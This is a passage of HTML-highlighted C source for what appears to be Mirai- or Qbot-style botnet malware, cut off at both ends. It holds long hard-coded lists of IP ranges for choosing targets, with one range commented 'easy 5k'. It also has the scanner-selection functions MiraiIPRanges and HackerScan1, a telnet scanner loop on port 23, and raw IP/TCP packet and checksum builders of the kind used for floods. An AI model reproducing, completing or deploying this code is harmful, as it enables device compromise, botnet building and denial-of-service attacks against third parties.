class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">229</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.178.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">230</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.179.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">231</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.180.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">232</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.181.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">233</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.182.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">234</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.183.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">235</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.184.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">236</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.185.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">237</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.186.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">238</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.187.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">239</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.188.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">240</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.189.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">241</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.190.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">242</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.191.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">243</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.121.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">244</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.120.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">245</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.115.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">256</span>)</span><br><span class="line">&#123;<span class="comment">//if you hit these ranges right here then easy 5k</span></span><br><span class="line">szprintf(ip, <span class="string">&quot;43.252.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">257</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.230.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">258</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.240.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">259</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.245.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">260</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.174.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">261</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;49.118.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">262</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;78.188.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">263</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.127.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">264</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.30.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">265</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.33.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">266</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;123.16.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">267</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;202.44.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">268</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;116.93.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">269</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;91.83.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">270</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.253.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">271</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.173.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">272</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.190.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">273</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;146.88.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">274</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;112.196.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">275</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.178.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">276</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;112.45.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">277</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;183.223.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">278</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;116.71.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">279</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;183.71.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">280</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;192.168.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">281</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;89.71.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">282</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;244.77.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">283</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.105.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">284</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;125.27.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">285</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.29.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">287</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.57.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">288</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.35.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">289</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.4.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">290</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;101.105.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> inet_addr(ip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> telnettestrange = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">telnettestfindARandomIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(telnettestrange &lt; <span class="number">1</span> || telnettestrange &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> getRandomPublicIP();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(telnettestrange == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> getRandomPublicIP();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(telnettestrange == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> HackerScan1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> HackerScan1();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> telnetrange = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">telnetfindARandomIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(telnetrange &lt; <span class="number">1</span> || telnetrange &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> getRandomPublicIP();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(telnetrange == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> getRandomPublicIP();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(telnetrange == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> HackerScan1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> HackerScan1();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> miraitestrange = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">miraitestfindARandomIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(miraitestrange &lt; <span class="number">1</span> || miraitestrange &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> getRandomPublicIP();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(miraitestrange == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> MiraiIPRanges();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(miraitestrange == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> HackerScan1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> MiraiIPRanges();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> mirairange = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">miraifindARandomIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(mirairange &lt; <span class="number">1</span> || mirairange &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> MiraiIPRanges();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(mirairange == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> getRandomPublicIP();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(mirairange == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> HackerScan1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> MiraiIPRanges();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">getRandomIP</span><span class="params">(<span class="keyword">in_addr_t</span> netmask)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">in_addr_t</span> tmp = ntohl(ourIP.s_addr) &amp; netmask;</span><br><span class="line">        <span class="keyword">return</span> tmp ^ ( rand_cmwc() &amp; ~netmask);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">csum</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *buf, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">uint64_t</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>( count &gt; <span class="number">1</span> ) &#123; sum += *buf++; count -= <span class="number">2</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span>(count &gt; <span class="number">0</span>) &#123; sum += *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)buf; &#125;</span><br><span class="line">        <span class="keyword">while</span> (sum&gt;&gt;<span class="number">16</span>) &#123; sum = (sum &amp; <span class="number">0xffff</span>) + (sum &gt;&gt; <span class="number">16</span>); &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">uint16_t</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">tcpcsum</span><span class="params">(struct iphdr *iph, struct tcphdr *tcph)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcp_pseudo</span> &#123;</span></span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> src_addr;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> dst_addr;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> zero;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> proto;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">short</span> length;</span><br><span class="line">        &#125; pseudohead;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> total_len = iph-&gt;tot_len;</span><br><span class="line">        pseudohead.src_addr=iph-&gt;saddr;</span><br><span class="line">        pseudohead.dst_addr=iph-&gt;daddr;</span><br><span class="line">        pseudohead.zero=<span class="number">0</span>;</span><br><span class="line">        pseudohead.proto=IPPROTO_TCP;</span><br><span class="line">        pseudohead.length=htons(<span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line">        <span class="keyword">int</span> totaltcp_len = <span class="keyword">sizeof</span>(struct tcp_pseudo) + <span class="keyword">sizeof</span>(struct tcphdr);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> *tcp = <span class="built_in">malloc</span>(totaltcp_len);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tcp,&amp;pseudohead,<span class="keyword">sizeof</span>(struct tcp_pseudo));</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tcp+<span class="keyword">sizeof</span>(struct tcp_pseudo),(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tcph,<span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> output = csum(tcp,totaltcp_len);</span><br><span class="line">        <span class="built_in">free</span>(tcp);</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makeIPPacket</span><span class="params">(struct iphdr *iph, <span class="keyword">uint32_t</span> dest, <span class="keyword">uint32_t</span> source, <span class="keyword">uint8_t</span> protocol, <span class="keyword">int</span> packetSize)</span> </span>&#123;</span><br><span class="line">        iph-&gt;ihl = <span class="number">5</span>;</span><br><span class="line">        iph-&gt;version = <span class="number">4</span>;</span><br><span class="line">        iph-&gt;tos = <span class="number">0</span>;</span><br><span class="line">        iph-&gt;tot_len = <span class="keyword">sizeof</span>(struct iphdr) + packetSize;</span><br><span class="line">        iph-&gt;id = rand_cmwc();</span><br><span class="line">        iph-&gt;frag_off = <span class="number">0</span>;</span><br><span class="line">        iph-&gt;ttl = MAXTTL;</span><br><span class="line">        iph-&gt;protocol = protocol;</span><br><span class="line">        iph-&gt;check = <span class="number">0</span>;</span><br><span class="line">        iph-&gt;saddr = source;</span><br><span class="line">        iph-&gt;daddr = dest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sclose</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">3</span> &gt; fd) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">echo_connect</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">in_port_t</span> port)</span></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">        <span class="keyword">int</span> on = <span class="number">1</span>, sock;     </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((hp = gethostbyname(host)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                herror(<span class="string">&quot;gethostbyname&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        bcopy(hp-&gt;h_addr, &amp;addr.sin_addr, hp-&gt;h_length);</span><br><span class="line">        addr.sin_port = htons(port);</span><br><span class="line">        addr.sin_family = AF_INET;</span><br><span class="line">        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;on, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sock == <span class="number">-1</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_in)) == <span class="number">-1</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BCMscanner</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> maxfds = <span class="number">312</span>, i, res, j, valopt;</span><br><span class="line"><span class="keyword">int</span> max = maxfds;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>], cur_dir;</span><br><span class="line">fd_set fdset;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> lon;</span><br><span class="line">srand(time(<span class="literal">NULL</span>) ^ rand_cmwc());</span><br><span class="line"><span class="keyword">char</span> line[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">char</span>* buffer;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">dest_addr.sin_family = AF_INET;</span><br><span class="line">dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line"><span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">buffer = <span class="built_in">malloc</span>(<span class="number">312</span> + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">312</span> + <span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">telstate_t</span> <span class="title">fds</span>[<span class="title">max</span>];</span></span><br><span class="line"><span class="built_in">memset</span>(fds, <span class="number">0</span>, max * (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">fds[i].sockbuf = buffer; &#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout == <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>); &#125;</span><br><span class="line"><span class="keyword">switch</span>(fds[i].state) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">char</span> *tmp = fds[i].sockbuf;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].sockbuf = tmp;</span><br><span class="line">fds[i].ip = BCMSCAN(); &#125;</span><br><span class="line">dest_addr.sin_family = AF_INET;</span><br><span class="line">dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line"><span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">dest_addr.sin_addr.s_addr = fds[i].ip;</span><br><span class="line">fds[i].fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span 